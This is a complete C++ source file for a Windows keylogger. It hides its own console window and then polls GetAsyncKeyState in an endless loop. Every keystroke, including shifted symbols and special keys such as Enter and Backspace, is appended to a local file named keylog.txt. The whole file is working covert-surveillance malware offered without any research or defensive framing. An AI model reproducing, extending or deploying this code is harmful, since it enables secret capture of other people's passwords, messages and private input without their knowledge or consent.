#include <windows.h>
#include <fstream>
#include <iostream>
#include <string>
#include <map>

// Function to hide the console window
void hideConsole() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}

// Function to log a single character key to a file
void logKey(char key) {
    std::ofstream logfile;
    logfile.open("keylog.txt", std::ios::app);
    logfile << key;
    logfile.close();
}

// Function to log a string (e.g., "[ESC]") to a file
void logString(const std::string& str) {
    std::ofstream logfile;
    logfile.open("keylog.txt", std::ios::app);
    logfile << str;
    logfile.close();
}

// Function to process special keys and log them
void processSpecialKeys(int key, bool shiftPressed) {
    std::map<int, std::string> specialKeys = {
        {VK_SPACE, "[SPACE]"},
        {VK_RETURN, "[ENTER]"},
        {VK_SHIFT, "[SHIFT]"},
        {VK_BACK, "[BACKSPACE]"},
        {VK_TAB, "[TAB]"},
        {VK_ESCAPE, "[ESC]"},
        {VK_LEFT, "[LEFT]"},
        {VK_RIGHT, "[RIGHT]"},
        {VK_UP, "[UP]"},
        {VK_DOWN, "[DOWN]"},
        {VK_CONTROL, "[CTRL]"},
        {VK_MENU, "[ALT]"},
        {VK_CAPITAL, "[CAPSLOCK]"},
        {VK_PRIOR, "[PAGEUP]"},
        {VK_NEXT, "[PAGEDOWN]"},
        {VK_END, "[END]"},
        {VK_HOME, "[HOME]"},
        {VK_INSERT, "[INSERT]"},
        {VK_DELETE, "[DELETE]"}
    };

    if (specialKeys.find(key) != specialKeys.end()) {
        logString(specialKeys[key]);
    } else if (key >= '0' && key <= '9') {
        // Handle number keys and shifted number keys for special characters
        switch (key) {
            case '1': logKey(shiftPressed ? '!' : '1'); break;
            case '2': logKey(shiftPressed ? '@' : '2'); break;
            case '3': logKey(shiftPressed ? '#' : '3'); break;
            case '4': logKey(shiftPressed ? '$' : '4'); break;
            case '5': logKey(shiftPressed ? '%' : '5'); break;
            case '6': logKey(shiftPressed ? '^' : '6'); break;
            case '7': logKey(shiftPressed ? '&' : '7'); break;
            case '8': logKey(shiftPressed ? '*' : '8'); break;
            case '9': logKey(shiftPressed ? '(' : '9'); break;
            case '0': logKey(shiftPressed ? ')' : '0'); break;
        }
    } else if (key >= 'A' && key <= 'Z') {
        // Handle alphabet keys, accounting for shift
        logKey(shiftPressed ? key : key + 32); // Convert to lowercase if shift is not pressed
    } else {
        // Handle other special characters
        switch (key) {
            case VK_OEM_1: logKey(shiftPressed ? ':' : ';'); break; // ;:
            case VK_OEM_2: logKey(shiftPressed ? '?' : '/'); break; // /?
            case VK_OEM_3: logKey(shiftPressed ? '~' : '`'); break; // `~
            case VK_OEM_4: logKey(shiftPressed ? '{' : '['); break; // [{
            case VK_OEM_5: logKey(shiftPressed ? '|' : '\\'); break; // \|
            case VK_OEM_6: logKey(shiftPressed ? '}' : ']'); break; // ]}
            case VK_OEM_7: logKey(shiftPressed ? '"' : '\''); break; // '"
            case VK_OEM_PERIOD: logKey(shiftPressed ? '>' : '.'); break; // .>
            case VK_OEM_COMMA: logKey(shiftPressed ? '<' : ','); break; // ,<
            default: logString("[UNKNOWN]"); break;
        }
    }
}

// Function to capture keystrokes
void captureKeystrokes() {
    std::map<int, bool> keyState; // Keeps track of key states (pressed/released)

    while (true) {
        bool shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;

        for (int key = 8; key <= 255; key++) {
            SHORT state = GetAsyncKeyState(key);
            bool isPressed = (state & 0x8000) != 0; // Check if key is pressed

            if (isPressed && !keyState[key]) {
                // Key was just pressed
                if ((key >= '0' && key <= '9') || (key >= 'A' && key <= 'Z') || (key >= VK_OEM_1 && key <= VK_OEM_3)) {
                    // Handle printable ASCII characters and special characters
                    processSpecialKeys(key, shiftPressed);
                } else {
                    // Handle other special keys
                    processSpecialKeys(key, shiftPressed);
                }
                keyState[key] = true; // Mark key as pressed
            } else if (!isPressed && keyState[key]) {
                // Key was just released
                keyState[key] = false; // Mark key as released
            }
        }
        Sleep(10); // Slight delay to prevent high CPU usage
    }
}

int main() {
    hideConsole();         // Hide the console window
    captureKeystrokes();   // Start capturing keystrokes

    return 0;
}
